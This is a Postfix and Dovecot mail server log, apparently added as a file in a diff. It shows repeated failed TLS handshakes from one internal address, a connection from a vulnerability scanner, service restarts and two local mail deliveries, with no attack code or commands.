+Nov  6 11:13:43 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:43 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:43 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:43 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:43 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:44 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:44 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:44 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:44 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:44 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:45 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:45 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:45 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:45 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:45 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:46 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:46 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:46 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:46 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:46 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:47 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:47 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:47 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:47 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:47 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:48 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:48 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:48 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:48 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:48 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:49 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:49 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:49 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:49 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:49 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:50 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:50 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:50 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:50 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:50 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:51 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:51 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:51 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:51 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:51 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:52 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:52 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:52 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:52 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:52 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:53 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:53 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:53 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:53 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:53 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:53 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:53 ubuntuA3 postfix/smtpd[6199]: warning: TLS library problem: 6199:error:140A1097:SSL routines:SSL_BYTES_TO_CIPHER_LIST:error in received cipher list:ssl_lib.c:1282:
+Nov  6 11:13:53 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:53 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:54 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:14:25 ubuntuA3 last message repeated 31 times
+Nov  6 11:14:52 ubuntuA3 last message repeated 34 times
+Nov  6 11:14:53 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:15:24 ubuntuA3 last message repeated 30 times
+Nov  6 11:15:29 ubuntuA3 last message repeated 5 times
+Nov  6 11:15:29 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:15:29 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:15:29 ubuntuA3 postfix/smtpd[6199]: lost connection after CONNECT from unknown[10.43.2.77]
+Nov  6 11:15:29 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:15:29 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:15:29 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:15:29 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:18:49 ubuntuA3 postfix/anvil[6202]: statistics: max connection rate 66/60s for (smtp:10.43.2.77) at Nov  6 11:13:44
+Nov  6 11:18:49 ubuntuA3 postfix/anvil[6202]: statistics: max connection count 1 for (smtp:10.43.2.77) at Nov  6 11:12:44
+Nov  6 11:18:49 ubuntuA3 postfix/anvil[6202]: statistics: max cache size 1 at Nov  6 11:12:44
+Nov  6 11:23:36 ubuntuA3 postfix/master[6206]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 11:23:36 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 11:33:22 ubuntuA3 postfix/master[5964]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 11:33:22 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 11:43:52 ubuntuA3 postfix/master[5964]: terminating on signal 15
+Nov  6 11:44:33 ubuntuA3 postfix/master[6243]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 11:44:33 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 11:48:11 ubuntuA3 postfix/master[6243]: terminating on signal 15
+Nov  6 11:48:58 ubuntuA3 postfix/master[5936]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 11:48:58 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 11:51:14 ubuntuA3 postfix/master[5957]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 11:51:14 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 11:53:33 ubuntuA3 postfix/master[6192]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 11:53:33 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 12:08:45 ubuntuA3 postfix/master[6192]: terminating on signal 15
+Nov  6 12:09:32 ubuntuA3 postfix/master[5944]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 12:09:32 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 14:16:50 ubuntuA3 postfix/master[5944]: terminating on signal 15
+Nov  6 14:17:37 ubuntuA3 postfix/master[6152]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 14:17:37 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 14:25:47 ubuntuA3 postfix/pickup[6156]: BDAC92A57C: uid=1004 from=<charlie>
+Nov  6 14:25:47 ubuntuA3 postfix/cleanup[6461]: BDAC92A57C: message-id=<20251106192547.BDAC92A57C@ubuntuA3.localdomain>
+Nov  6 14:25:47 ubuntuA3 postfix/qmgr[6157]: BDAC92A57C: from=<charlie@ubuntuA3.localdomain>, size=540, nrcpt=1 (queue active)
+Nov  6 14:25:48 ubuntuA3 postfix/local[6463]: BDAC92A57C: to=<arnold@ubuntuA3.localdomain>, orig_to=<root>, relay=local, delay=1.1, delays=0.03/0.01/0/1, dsn=2.0.0, status=sent (delivered to command: procmail -a "$EXTENSION")
+Nov  6 14:25:48 ubuntuA3 postfix/qmgr[6157]: BDAC92A57C: removed
+Nov  6 20:22:33 ubuntuA3 postfix/master[5956]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 20:22:33 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 22:27:03 ubuntuA3 postfix/master[5966]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 22:27:03 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 22:33:45 ubuntuA3 postfix/master[6207]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 22:33:45 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 02:13:54 ubuntuA3 postfix/smtpd[6684]: connect from vuln-was-scan02.siem.utoronto.ca[142.150.51.146]
+Nov  7 02:13:58 ubuntuA3 postfix/smtpd[6684]: lost connection after CONNECT from vuln-was-scan02.siem.utoronto.ca[142.150.51.146]
+Nov  7 02:13:58 ubuntuA3 postfix/smtpd[6684]: disconnect from vuln-was-scan02.siem.utoronto.ca[142.150.51.146]
+Nov  7 02:15:32 ubuntuA3 dovecot: imap-login: Disconnected: rip=142.150.51.146, lip=142.1.46.123, TLS handshake
+Nov  7 02:15:40 ubuntuA3 last message repeated 8 times
+Nov  7 02:17:18 ubuntuA3 postfix/anvil[6687]: statistics: max connection rate 1/60s for (smtp:142.150.51.146) at Nov  7 02:13:54
+Nov  7 02:17:18 ubuntuA3 postfix/anvil[6687]: statistics: max connection count 1 for (smtp:142.150.51.146) at Nov  7 02:13:54
+Nov  7 02:17:18 ubuntuA3 postfix/anvil[6687]: statistics: max cache size 1 at Nov  7 02:13:54
+Nov  7 09:02:44 ubuntuA3 postfix/master[6284]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 09:02:44 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 09:25:36 ubuntuA3 postfix/pickup[6288]: 31BFC2A833: uid=1004 from=<charlie>
+Nov  7 09:25:36 ubuntuA3 postfix/cleanup[6566]: 31BFC2A833: message-id=<20251107142536.31BFC2A833@ubuntuA3.localdomain>
+Nov  7 09:25:36 ubuntuA3 postfix/qmgr[6289]: 31BFC2A833: from=<charlie@ubuntuA3.localdomain>, size=541, nrcpt=1 (queue active)
+Nov  7 09:25:36 ubuntuA3 postfix/local[6568]: 31BFC2A833: to=<arnold@ubuntuA3.localdomain>, orig_to=<root>, relay=local, delay=0.05, delays=0.04/0/0/0.02, dsn=2.0.0, status=sent (delivered to command: procmail -a "$EXTENSION")
+Nov  7 09:25:36 ubuntuA3 postfix/qmgr[6289]: 31BFC2A833: removed
+Nov  7 10:07:34 ubuntuA3 postfix/master[5965]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 10:07:34 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 10:13:45 ubuntuA3 postfix/master[5727]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 10:13:45 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 10:19:43 ubuntuA3 postfix/master[5787]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 10:19:43 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 10:29:08 ubuntuA3 postfix/master[5394]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 10:29:08 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 10:52:08 ubuntuA3 postfix/master[5424]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 10:52:08 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 11:44:18 ubuntuA3 postfix/master[5424]: terminating on signal 15
+Nov  7 11:44:58 ubuntuA3 postfix/master[5379]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 11:44:58 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 11:48:32 ubuntuA3 postfix/master[5379]: terminating on signal 15
+Nov  7 11:49:11 ubuntuA3 postfix/master[5790]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 11:49:11 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 11:52:11 ubuntuA3 postfix/master[5392]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 11:52:11 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 18:22:33 ubuntuA3 postfix/master[5392]: terminating on signal 15
+Nov  7 18:23:15 ubuntuA3 postfix/master[5402]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 18:23:15 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  7 18:34:49 ubuntuA3 postfix/master[5402]: terminating on signal 15
+Nov  7 18:35:30 ubuntuA3 postfix/master[5412]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  7 18:35:30 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
